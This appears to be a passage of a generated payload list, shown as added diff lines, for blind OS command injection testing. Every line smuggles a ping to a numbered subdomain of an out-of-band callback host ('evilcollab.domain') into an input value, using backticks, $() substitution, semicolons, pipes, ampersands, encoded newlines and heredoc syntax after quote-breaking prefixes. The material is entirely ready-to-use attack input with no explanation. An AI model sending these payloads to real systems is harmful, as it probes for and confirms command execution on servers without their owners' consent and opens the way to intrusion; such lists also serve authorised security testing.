+1|`ping  x1234.lookup.evilcollab.domain`|foo
+foo|`ping  x1235.lookup.evilcollab.domain`|foo
+invvvvv212.org"|`ping  x1236.lookup.evilcollab.domain`|foo"
+invvvvv212.org'|`ping  x1237.lookup.evilcollab.domain`|foo'
+1"|`ping  x1238.lookup.evilcollab.domain`|foo"
+1'|`ping  x1239.lookup.evilcollab.domain`|foo'
+foo"|`ping  x1240.lookup.evilcollab.domain`|foo"
+foo'|`ping  x1241.lookup.evilcollab.domain`|foo'
+invvvvv212.org<<D%0aD%0a`ping  x1242.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0a`ping  x1243.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0a`ping  x1244.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0a`ping  x1245.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0a`ping  x1246.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0a`ping  x1247.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0a`ping  x1248.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0a`ping  x1249.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0a`ping  x1250.lookup.evilcollab.domain`<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0a`ping  x1251.lookup.evilcollab.domain`<<D%0aD%0a1
+1<<D%0aD%0a`ping  x1252.lookup.evilcollab.domain`<<D%0aD%0a1
+foo<<D%0aD%0a`ping  x1253.lookup.evilcollab.domain`<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0a`ping  x1254.lookup.evilcollab.domain`<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0a`ping  x1255.lookup.evilcollab.domain`<<D%0aD%0a1'
+1"<<D%0aD%0a`ping  x1256.lookup.evilcollab.domain`<<D%0aD%0a1"
+1'<<D%0aD%0a`ping  x1257.lookup.evilcollab.domain`<<D%0aD%0a1'
+foo"<<D%0aD%0a`ping  x1258.lookup.evilcollab.domain`<<D%0aD%0a1"
+foo'<<D%0aD%0a`ping  x1259.lookup.evilcollab.domain`<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0a`ping  x1260.lookup.evilcollab.domain`<<D%0aD%0afoo
+1<<D%0aD%0a`ping  x1261.lookup.evilcollab.domain`<<D%0aD%0afoo
+foo<<D%0aD%0a`ping  x1262.lookup.evilcollab.domain`<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0a`ping  x1263.lookup.evilcollab.domain`<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0a`ping  x1264.lookup.evilcollab.domain`<<D%0aD%0afoo'
+1"<<D%0aD%0a`ping  x1265.lookup.evilcollab.domain`<<D%0aD%0afoo"
+1'<<D%0aD%0a`ping  x1266.lookup.evilcollab.domain`<<D%0aD%0afoo'
+foo"<<D%0aD%0a`ping  x1267.lookup.evilcollab.domain`<<D%0aD%0afoo"
+foo'<<D%0aD%0a`ping  x1268.lookup.evilcollab.domain`<<D%0aD%0afoo'
+invvvvv212.org%0a%0aping		x1269.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+1%0a%0aping		x1270.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+foo%0a%0aping		x1271.lookup.evilcollab.domain%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0aping		x1272.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0aping		x1273.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+1"%0a%0aping		x1274.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+1'%0a%0aping		x1275.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+foo"%0a%0aping		x1276.lookup.evilcollab.domain%0a%0ainvvvvv212.org"
+foo'%0a%0aping		x1277.lookup.evilcollab.domain%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0aping		x1278.lookup.evilcollab.domain%0a%0a1
+1%0a%0aping		x1279.lookup.evilcollab.domain%0a%0a1
+foo%0a%0aping		x1280.lookup.evilcollab.domain%0a%0a1
+invvvvv212.org"%0a%0aping		x1281.lookup.evilcollab.domain%0a%0a1"
+invvvvv212.org'%0a%0aping		x1282.lookup.evilcollab.domain%0a%0a1'
+1"%0a%0aping		x1283.lookup.evilcollab.domain%0a%0a1"
+1'%0a%0aping		x1284.lookup.evilcollab.domain%0a%0a1'
+foo"%0a%0aping		x1285.lookup.evilcollab.domain%0a%0a1"
+foo'%0a%0aping		x1286.lookup.evilcollab.domain%0a%0a1'
+invvvvv212.org%0a%0aping		x1287.lookup.evilcollab.domain%0a%0afoo
+1%0a%0aping		x1288.lookup.evilcollab.domain%0a%0afoo
+foo%0a%0aping		x1289.lookup.evilcollab.domain%0a%0afoo
+invvvvv212.org"%0a%0aping		x1290.lookup.evilcollab.domain%0a%0afoo"
+invvvvv212.org'%0a%0aping		x1291.lookup.evilcollab.domain%0a%0afoo'
+1"%0a%0aping		x1292.lookup.evilcollab.domain%0a%0afoo"
+1'%0a%0aping		x1293.lookup.evilcollab.domain%0a%0afoo'
+foo"%0a%0aping		x1294.lookup.evilcollab.domain%0a%0afoo"
+foo'%0a%0aping		x1295.lookup.evilcollab.domain%0a%0afoo'
+invvvvv212.org%0d%0dping		x1296.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+1%0d%0dping		x1297.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+foo%0d%0dping		x1298.lookup.evilcollab.domain%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0dping		x1299.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0dping		x1300.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+1"%0d%0dping		x1301.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+1'%0d%0dping		x1302.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+foo"%0d%0dping		x1303.lookup.evilcollab.domain%0d%0dinvvvvv212.org"
+foo'%0d%0dping		x1304.lookup.evilcollab.domain%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0dping		x1305.lookup.evilcollab.domain%0d%0d1
+1%0d%0dping		x1306.lookup.evilcollab.domain%0d%0d1
+foo%0d%0dping		x1307.lookup.evilcollab.domain%0d%0d1
+invvvvv212.org"%0d%0dping		x1308.lookup.evilcollab.domain%0d%0d1"
+invvvvv212.org'%0d%0dping		x1309.lookup.evilcollab.domain%0d%0d1'
+1"%0d%0dping		x1310.lookup.evilcollab.domain%0d%0d1"
+1'%0d%0dping		x1311.lookup.evilcollab.domain%0d%0d1'
+foo"%0d%0dping		x1312.lookup.evilcollab.domain%0d%0d1"
+foo'%0d%0dping		x1313.lookup.evilcollab.domain%0d%0d1'
+invvvvv212.org%0d%0dping		x1314.lookup.evilcollab.domain%0d%0dfoo
+1%0d%0dping		x1315.lookup.evilcollab.domain%0d%0dfoo
+foo%0d%0dping		x1316.lookup.evilcollab.domain%0d%0dfoo
+invvvvv212.org"%0d%0dping		x1317.lookup.evilcollab.domain%0d%0dfoo"
+invvvvv212.org'%0d%0dping		x1318.lookup.evilcollab.domain%0d%0dfoo'
+1"%0d%0dping		x1319.lookup.evilcollab.domain%0d%0dfoo"
+1'%0d%0dping		x1320.lookup.evilcollab.domain%0d%0dfoo'
+foo"%0d%0dping		x1321.lookup.evilcollab.domain%0d%0dfoo"
+foo'%0d%0dping		x1322.lookup.evilcollab.domain%0d%0dfoo'
+invvvvv212.org;ping		x1323.lookup.evilcollab.domain;invvvvv212.org
+1;ping		x1324.lookup.evilcollab.domain;invvvvv212.org
+foo;ping		x1325.lookup.evilcollab.domain;invvvvv212.org
+invvvvv212.org";ping		x1326.lookup.evilcollab.domain;invvvvv212.org"
+invvvvv212.org';ping		x1327.lookup.evilcollab.domain;invvvvv212.org'
+1";ping		x1328.lookup.evilcollab.domain;invvvvv212.org"
+1';ping		x1329.lookup.evilcollab.domain;invvvvv212.org'
+foo";ping		x1330.lookup.evilcollab.domain;invvvvv212.org"
+foo';ping		x1331.lookup.evilcollab.domain;invvvvv212.org'
+invvvvv212.org;ping		x1332.lookup.evilcollab.domain;1
+1;ping		x1333.lookup.evilcollab.domain;1
+foo;ping		x1334.lookup.evilcollab.domain;1
+invvvvv212.org";ping		x1335.lookup.evilcollab.domain;1"
+invvvvv212.org';ping		x1336.lookup.evilcollab.domain;1'
+1";ping		x1337.lookup.evilcollab.domain;1"
+1';ping		x1338.lookup.evilcollab.domain;1'
+foo";ping		x1339.lookup.evilcollab.domain;1"
+foo';ping		x1340.lookup.evilcollab.domain;1'
+invvvvv212.org;ping		x1341.lookup.evilcollab.domain;foo
+1;ping		x1342.lookup.evilcollab.domain;foo
+foo;ping		x1343.lookup.evilcollab.domain;foo
+invvvvv212.org";ping		x1344.lookup.evilcollab.domain;foo"
+invvvvv212.org';ping		x1345.lookup.evilcollab.domain;foo'
+1";ping		x1346.lookup.evilcollab.domain;foo"
+1';ping		x1347.lookup.evilcollab.domain;foo'
+foo";ping		x1348.lookup.evilcollab.domain;foo"
+foo';ping		x1349.lookup.evilcollab.domain;foo'
+invvvvv212.org%26ping		x1350.lookup.evilcollab.domain%26invvvvv212.org
+1%26ping		x1351.lookup.evilcollab.domain%26invvvvv212.org
+foo%26ping		x1352.lookup.evilcollab.domain%26invvvvv212.org
+invvvvv212.org"%26ping		x1353.lookup.evilcollab.domain%26invvvvv212.org"
+invvvvv212.org'%26ping		x1354.lookup.evilcollab.domain%26invvvvv212.org'
+1"%26ping		x1355.lookup.evilcollab.domain%26invvvvv212.org"
+1'%26ping		x1356.lookup.evilcollab.domain%26invvvvv212.org'
+foo"%26ping		x1357.lookup.evilcollab.domain%26invvvvv212.org"
+foo'%26ping		x1358.lookup.evilcollab.domain%26invvvvv212.org'
+invvvvv212.org%26ping		x1359.lookup.evilcollab.domain%261
+1%26ping		x1360.lookup.evilcollab.domain%261
+foo%26ping		x1361.lookup.evilcollab.domain%261
+invvvvv212.org"%26ping		x1362.lookup.evilcollab.domain%261"
+invvvvv212.org'%26ping		x1363.lookup.evilcollab.domain%261'
+1"%26ping		x1364.lookup.evilcollab.domain%261"
+1'%26ping		x1365.lookup.evilcollab.domain%261'
+foo"%26ping		x1366.lookup.evilcollab.domain%261"
+foo'%26ping		x1367.lookup.evilcollab.domain%261'
+invvvvv212.org%26ping		x1368.lookup.evilcollab.domain%26foo
+1%26ping		x1369.lookup.evilcollab.domain%26foo
+foo%26ping		x1370.lookup.evilcollab.domain%26foo
+invvvvv212.org"%26ping		x1371.lookup.evilcollab.domain%26foo"
+invvvvv212.org'%26ping		x1372.lookup.evilcollab.domain%26foo'
+1"%26ping		x1373.lookup.evilcollab.domain%26foo"
+1'%26ping		x1374.lookup.evilcollab.domain%26foo'
+foo"%26ping		x1375.lookup.evilcollab.domain%26foo"
+foo'%26ping		x1376.lookup.evilcollab.domain%26foo'
+invvvvv212.org|ping		x1377.lookup.evilcollab.domain|invvvvv212.org
+1|ping		x1378.lookup.evilcollab.domain|invvvvv212.org
+foo|ping		x1379.lookup.evilcollab.domain|invvvvv212.org
+invvvvv212.org"|ping		x1380.lookup.evilcollab.domain|invvvvv212.org"
+invvvvv212.org'|ping		x1381.lookup.evilcollab.domain|invvvvv212.org'
+1"|ping		x1382.lookup.evilcollab.domain|invvvvv212.org"
+1'|ping		x1383.lookup.evilcollab.domain|invvvvv212.org'
+foo"|ping		x1384.lookup.evilcollab.domain|invvvvv212.org"
+foo'|ping		x1385.lookup.evilcollab.domain|invvvvv212.org'
+invvvvv212.org|ping		x1386.lookup.evilcollab.domain|1
+1|ping		x1387.lookup.evilcollab.domain|1
+foo|ping		x1388.lookup.evilcollab.domain|1
+invvvvv212.org"|ping		x1389.lookup.evilcollab.domain|1"
+invvvvv212.org'|ping		x1390.lookup.evilcollab.domain|1'
+1"|ping		x1391.lookup.evilcollab.domain|1"
+1'|ping		x1392.lookup.evilcollab.domain|1'
+foo"|ping		x1393.lookup.evilcollab.domain|1"
+foo'|ping		x1394.lookup.evilcollab.domain|1'
+invvvvv212.org|ping		x1395.lookup.evilcollab.domain|foo
+1|ping		x1396.lookup.evilcollab.domain|foo
+foo|ping		x1397.lookup.evilcollab.domain|foo
+invvvvv212.org"|ping		x1398.lookup.evilcollab.domain|foo"
+invvvvv212.org'|ping		x1399.lookup.evilcollab.domain|foo'
+1"|ping		x1400.lookup.evilcollab.domain|foo"
+1'|ping		x1401.lookup.evilcollab.domain|foo'
+foo"|ping		x1402.lookup.evilcollab.domain|foo"
+foo'|ping		x1403.lookup.evilcollab.domain|foo'
+invvvvv212.org<<D%0aD%0aping		x1404.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0aping		x1405.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0aping		x1406.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0aping		x1407.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0aping		x1408.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0aping		x1409.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0aping		x1410.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0aping		x1411.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0aping		x1412.lookup.evilcollab.domain<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0aping		x1413.lookup.evilcollab.domain<<D%0aD%0a1
+1<<D%0aD%0aping		x1414.lookup.evilcollab.domain<<D%0aD%0a1
+foo<<D%0aD%0aping		x1415.lookup.evilcollab.domain<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0aping		x1416.lookup.evilcollab.domain<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0aping		x1417.lookup.evilcollab.domain<<D%0aD%0a1'
+1"<<D%0aD%0aping		x1418.lookup.evilcollab.domain<<D%0aD%0a1"
+1'<<D%0aD%0aping		x1419.lookup.evilcollab.domain<<D%0aD%0a1'
+foo"<<D%0aD%0aping		x1420.lookup.evilcollab.domain<<D%0aD%0a1"
+foo'<<D%0aD%0aping		x1421.lookup.evilcollab.domain<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0aping		x1422.lookup.evilcollab.domain<<D%0aD%0afoo
+1<<D%0aD%0aping		x1423.lookup.evilcollab.domain<<D%0aD%0afoo
+foo<<D%0aD%0aping		x1424.lookup.evilcollab.domain<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0aping		x1425.lookup.evilcollab.domain<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0aping		x1426.lookup.evilcollab.domain<<D%0aD%0afoo'
+1"<<D%0aD%0aping		x1427.lookup.evilcollab.domain<<D%0aD%0afoo"
+1'<<D%0aD%0aping		x1428.lookup.evilcollab.domain<<D%0aD%0afoo'
+foo"<<D%0aD%0aping		x1429.lookup.evilcollab.domain<<D%0aD%0afoo"
+foo'<<D%0aD%0aping		x1430.lookup.evilcollab.domain<<D%0aD%0afoo'
+invvvvv212.org%0a%0a$(ping		x1431.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+1%0a%0a$(ping		x1432.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+foo%0a%0a$(ping		x1433.lookup.evilcollab.domain)%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0a$(ping		x1434.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0a$(ping		x1435.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+1"%0a%0a$(ping		x1436.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+1'%0a%0a$(ping		x1437.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+foo"%0a%0a$(ping		x1438.lookup.evilcollab.domain)%0a%0ainvvvvv212.org"
+foo'%0a%0a$(ping		x1439.lookup.evilcollab.domain)%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0a$(ping		x1440.lookup.evilcollab.domain)%0a%0a1
+1%0a%0a$(ping		x1441.lookup.evilcollab.domain)%0a%0a1
+foo%0a%0a$(ping		x1442.lookup.evilcollab.domain)%0a%0a1
+invvvvv212.org"%0a%0a$(ping		x1443.lookup.evilcollab.domain)%0a%0a1"
+invvvvv212.org'%0a%0a$(ping		x1444.lookup.evilcollab.domain)%0a%0a1'
+1"%0a%0a$(ping		x1445.lookup.evilcollab.domain)%0a%0a1"
+1'%0a%0a$(ping		x1446.lookup.evilcollab.domain)%0a%0a1'
+foo"%0a%0a$(ping		x1447.lookup.evilcollab.domain)%0a%0a1"
+foo'%0a%0a$(ping		x1448.lookup.evilcollab.domain)%0a%0a1'
+invvvvv212.org%0a%0a$(ping		x1449.lookup.evilcollab.domain)%0a%0afoo
+1%0a%0a$(ping		x1450.lookup.evilcollab.domain)%0a%0afoo
+foo%0a%0a$(ping		x1451.lookup.evilcollab.domain)%0a%0afoo
+invvvvv212.org"%0a%0a$(ping		x1452.lookup.evilcollab.domain)%0a%0afoo"
+invvvvv212.org'%0a%0a$(ping		x1453.lookup.evilcollab.domain)%0a%0afoo'
+1"%0a%0a$(ping		x1454.lookup.evilcollab.domain)%0a%0afoo"
+1'%0a%0a$(ping		x1455.lookup.evilcollab.domain)%0a%0afoo'
+foo"%0a%0a$(ping		x1456.lookup.evilcollab.domain)%0a%0afoo"
+foo'%0a%0a$(ping		x1457.lookup.evilcollab.domain)%0a%0afoo'
+invvvvv212.org%0d%0d$(ping		x1458.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+1%0d%0d$(ping		x1459.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+foo%0d%0d$(ping		x1460.lookup.evilcollab.domain)%0d%0dinvvvvv212.org
+invvvvv212.org"%0d%0d$(ping		x1461.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+invvvvv212.org'%0d%0d$(ping		x1462.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+1"%0d%0d$(ping		x1463.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+1'%0d%0d$(ping		x1464.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+foo"%0d%0d$(ping		x1465.lookup.evilcollab.domain)%0d%0dinvvvvv212.org"
+foo'%0d%0d$(ping		x1466.lookup.evilcollab.domain)%0d%0dinvvvvv212.org'
+invvvvv212.org%0d%0d$(ping		x1467.lookup.evilcollab.domain)%0d%0d1
+1%0d%0d$(ping		x1468.lookup.evilcollab.domain)%0d%0d1
+foo%0d%0d$(ping		x1469.lookup.evilcollab.domain)%0d%0d1
+invvvvv212.org"%0d%0d$(ping		x1470.lookup.evilcollab.domain)%0d%0d1"
+invvvvv212.org'%0d%0d$(ping		x1471.lookup.evilcollab.domain)%0d%0d1'
+1"%0d%0d$(ping		x1472.lookup.evilcollab.domain)%0d%0d1"
+1'%0d%0d$(ping		x1473.lookup.evilcollab.domain)%0d%0d1'
+foo"%0d%0d$(ping		x1474.lookup.evilcollab.domain)%0d%0d1"
+foo'%0d%0d$(ping		x1475.lookup.evilcollab.domain)%0d%0d1'
+invvvvv212.org%0d%0d$(ping		x1476.lookup.evilcollab.domain)%0d%0dfoo
+1%0d%0d$(ping		x1477.lookup.evilcollab.domain)%0d%0dfoo
+foo%0d%0d$(ping		x1478.lookup.evilcollab.domain)%0d%0dfoo
+invvvvv212.org"%0d%0d$(ping		x1479.lookup.evilcollab.domain)%0d%0dfoo"
+invvvvv212.org'%0d%0d$(ping		x1480.lookup.evilcollab.domain)%0d%0dfoo'
+1"%0d%0d$(ping		x1481.lookup.evilcollab.domain)%0d%0dfoo"
+1'%0d%0d$(ping		x1482.lookup.evilcollab.domain)%0d%0dfoo'
+foo"%0d%0d$(ping		x1483.lookup.evilcollab.domain)%0d%0dfoo"
+foo'%0d%0d$(ping		x1484.lookup.evilcollab.domain)%0d%0dfoo'
+invvvvv212.org;$(ping		x1485.lookup.evilcollab.domain);invvvvv212.org
+1;$(ping		x1486.lookup.evilcollab.domain);invvvvv212.org
+foo;$(ping		x1487.lookup.evilcollab.domain);invvvvv212.org
+invvvvv212.org";$(ping		x1488.lookup.evilcollab.domain);invvvvv212.org"
+invvvvv212.org';$(ping		x1489.lookup.evilcollab.domain);invvvvv212.org'
+1";$(ping		x1490.lookup.evilcollab.domain);invvvvv212.org"
+1';$(ping		x1491.lookup.evilcollab.domain);invvvvv212.org'
+foo";$(ping		x1492.lookup.evilcollab.domain);invvvvv212.org"
+foo';$(ping		x1493.lookup.evilcollab.domain);invvvvv212.org'
+invvvvv212.org;$(ping		x1494.lookup.evilcollab.domain);1
+1;$(ping		x1495.lookup.evilcollab.domain);1
+foo;$(ping		x1496.lookup.evilcollab.domain);1
+invvvvv212.org";$(ping		x1497.lookup.evilcollab.domain);1"
+invvvvv212.org';$(ping		x1498.lookup.evilcollab.domain);1'
+1";$(ping		x1499.lookup.evilcollab.domain);1"
+1';$(ping		x1500.lookup.evilcollab.domain);1'
+foo";$(ping		x1501.lookup.evilcollab.domain);1"
+foo';$(ping		x1502.lookup.evilcollab.domain);1'
+invvvvv212.org;$(ping		x1503.lookup.evilcollab.domain);foo
+1;$(ping		x1504.lookup.evilcollab.domain);foo
+foo;$(ping		x1505.lookup.evilcollab.domain);foo
+invvvvv212.org";$(ping		x1506.lookup.evilcollab.domain);foo"
+invvvvv212.org';$(ping		x1507.lookup.evilcollab.domain);foo'
+1";$(ping		x1508.lookup.evilcollab.domain);foo"
+1';$(ping		x1509.lookup.evilcollab.domain);foo'
+foo";$(ping		x1510.lookup.evilcollab.domain);foo"
+foo';$(ping		x1511.lookup.evilcollab.domain);foo'
+invvvvv212.org%26$(ping		x1512.lookup.evilcollab.domain)%26invvvvv212.org
+1%26$(ping		x1513.lookup.evilcollab.domain)%26invvvvv212.org
+foo%26$(ping		x1514.lookup.evilcollab.domain)%26invvvvv212.org
+invvvvv212.org"%26$(ping		x1515.lookup.evilcollab.domain)%26invvvvv212.org"
+invvvvv212.org'%26$(ping		x1516.lookup.evilcollab.domain)%26invvvvv212.org'
+1"%26$(ping		x1517.lookup.evilcollab.domain)%26invvvvv212.org"
+1'%26$(ping		x1518.lookup.evilcollab.domain)%26invvvvv212.org'
+foo"%26$(ping		x1519.lookup.evilcollab.domain)%26invvvvv212.org"
+foo'%26$(ping		x1520.lookup.evilcollab.domain)%26invvvvv212.org'
+invvvvv212.org%26$(ping		x1521.lookup.evilcollab.domain)%261
+1%26$(ping		x1522.lookup.evilcollab.domain)%261
+foo%26$(ping		x1523.lookup.evilcollab.domain)%261
+invvvvv212.org"%26$(ping		x1524.lookup.evilcollab.domain)%261"
+invvvvv212.org'%26$(ping		x1525.lookup.evilcollab.domain)%261'
+1"%26$(ping		x1526.lookup.evilcollab.domain)%261"
+1'%26$(ping		x1527.lookup.evilcollab.domain)%261'
+foo"%26$(ping		x1528.lookup.evilcollab.domain)%261"
+foo'%26$(ping		x1529.lookup.evilcollab.domain)%261'
+invvvvv212.org%26$(ping		x1530.lookup.evilcollab.domain)%26foo
+1%26$(ping		x1531.lookup.evilcollab.domain)%26foo
+foo%26$(ping		x1532.lookup.evilcollab.domain)%26foo
+invvvvv212.org"%26$(ping		x1533.lookup.evilcollab.domain)%26foo"
+invvvvv212.org'%26$(ping		x1534.lookup.evilcollab.domain)%26foo'
+1"%26$(ping		x1535.lookup.evilcollab.domain)%26foo"
+1'%26$(ping		x1536.lookup.evilcollab.domain)%26foo'
+foo"%26$(ping		x1537.lookup.evilcollab.domain)%26foo"
+foo'%26$(ping		x1538.lookup.evilcollab.domain)%26foo'
+invvvvv212.org|$(ping		x1539.lookup.evilcollab.domain)|invvvvv212.org
+1|$(ping		x1540.lookup.evilcollab.domain)|invvvvv212.org
+foo|$(ping		x1541.lookup.evilcollab.domain)|invvvvv212.org
+invvvvv212.org"|$(ping		x1542.lookup.evilcollab.domain)|invvvvv212.org"
+invvvvv212.org'|$(ping		x1543.lookup.evilcollab.domain)|invvvvv212.org'
+1"|$(ping		x1544.lookup.evilcollab.domain)|invvvvv212.org"
+1'|$(ping		x1545.lookup.evilcollab.domain)|invvvvv212.org'
+foo"|$(ping		x1546.lookup.evilcollab.domain)|invvvvv212.org"
+foo'|$(ping		x1547.lookup.evilcollab.domain)|invvvvv212.org'
+invvvvv212.org|$(ping		x1548.lookup.evilcollab.domain)|1
+1|$(ping		x1549.lookup.evilcollab.domain)|1
+foo|$(ping		x1550.lookup.evilcollab.domain)|1
+invvvvv212.org"|$(ping		x1551.lookup.evilcollab.domain)|1"
+invvvvv212.org'|$(ping		x1552.lookup.evilcollab.domain)|1'
+1"|$(ping		x1553.lookup.evilcollab.domain)|1"
+1'|$(ping		x1554.lookup.evilcollab.domain)|1'
+foo"|$(ping		x1555.lookup.evilcollab.domain)|1"
+foo'|$(ping		x1556.lookup.evilcollab.domain)|1'
+invvvvv212.org|$(ping		x1557.lookup.evilcollab.domain)|foo
+1|$(ping		x1558.lookup.evilcollab.domain)|foo
+foo|$(ping		x1559.lookup.evilcollab.domain)|foo
+invvvvv212.org"|$(ping		x1560.lookup.evilcollab.domain)|foo"
+invvvvv212.org'|$(ping		x1561.lookup.evilcollab.domain)|foo'
+1"|$(ping		x1562.lookup.evilcollab.domain)|foo"
+1'|$(ping		x1563.lookup.evilcollab.domain)|foo'
+foo"|$(ping		x1564.lookup.evilcollab.domain)|foo"
+foo'|$(ping		x1565.lookup.evilcollab.domain)|foo'
+invvvvv212.org<<D%0aD%0a$(ping		x1566.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+1<<D%0aD%0a$(ping		x1567.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+foo<<D%0aD%0a$(ping		x1568.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org
+invvvvv212.org"<<D%0aD%0a$(ping		x1569.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+invvvvv212.org'<<D%0aD%0a$(ping		x1570.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+1"<<D%0aD%0a$(ping		x1571.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+1'<<D%0aD%0a$(ping		x1572.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+foo"<<D%0aD%0a$(ping		x1573.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org"
+foo'<<D%0aD%0a$(ping		x1574.lookup.evilcollab.domain)<<D%0aD%0ainvvvvv212.org'
+invvvvv212.org<<D%0aD%0a$(ping		x1575.lookup.evilcollab.domain)<<D%0aD%0a1
+1<<D%0aD%0a$(ping		x1576.lookup.evilcollab.domain)<<D%0aD%0a1
+foo<<D%0aD%0a$(ping		x1577.lookup.evilcollab.domain)<<D%0aD%0a1
+invvvvv212.org"<<D%0aD%0a$(ping		x1578.lookup.evilcollab.domain)<<D%0aD%0a1"
+invvvvv212.org'<<D%0aD%0a$(ping		x1579.lookup.evilcollab.domain)<<D%0aD%0a1'
+1"<<D%0aD%0a$(ping		x1580.lookup.evilcollab.domain)<<D%0aD%0a1"
+1'<<D%0aD%0a$(ping		x1581.lookup.evilcollab.domain)<<D%0aD%0a1'
+foo"<<D%0aD%0a$(ping		x1582.lookup.evilcollab.domain)<<D%0aD%0a1"
+foo'<<D%0aD%0a$(ping		x1583.lookup.evilcollab.domain)<<D%0aD%0a1'
+invvvvv212.org<<D%0aD%0a$(ping		x1584.lookup.evilcollab.domain)<<D%0aD%0afoo
+1<<D%0aD%0a$(ping		x1585.lookup.evilcollab.domain)<<D%0aD%0afoo
+foo<<D%0aD%0a$(ping		x1586.lookup.evilcollab.domain)<<D%0aD%0afoo
+invvvvv212.org"<<D%0aD%0a$(ping		x1587.lookup.evilcollab.domain)<<D%0aD%0afoo"
+invvvvv212.org'<<D%0aD%0a$(ping		x1588.lookup.evilcollab.domain)<<D%0aD%0afoo'
+1"<<D%0aD%0a$(ping		x1589.lookup.evilcollab.domain)<<D%0aD%0afoo"
+1'<<D%0aD%0a$(ping		x1590.lookup.evilcollab.domain)<<D%0aD%0afoo'
+foo"<<D%0aD%0a$(ping		x1591.lookup.evilcollab.domain)<<D%0aD%0afoo"
+foo'<<D%0aD%0a$(ping		x1592.lookup.evilcollab.domain)<<D%0aD%0afoo'
+invvvvv212.org%0a%0a`ping		x1593.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+1%0a%0a`ping		x1594.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+foo%0a%0a`ping		x1595.lookup.evilcollab.domain`%0a%0ainvvvvv212.org
+invvvvv212.org"%0a%0a`ping		x1596.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+invvvvv212.org'%0a%0a`ping		x1597.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+1"%0a%0a`ping		x1598.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+1'%0a%0a`ping		x1599.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+foo"%0a%0a`ping		x1600.lookup.evilcollab.domain`%0a%0ainvvvvv212.org"
+foo'%0a%0a`ping		x1601.lookup.evilcollab.domain`%0a%0ainvvvvv212.org'
+invvvvv212.org%0a%0a`ping		x1602.lookup.evilcollab.domain`%0a%0a1
+1%0a%0a`ping		x1603.lookup.evilcollab.domain`%0a%0a1
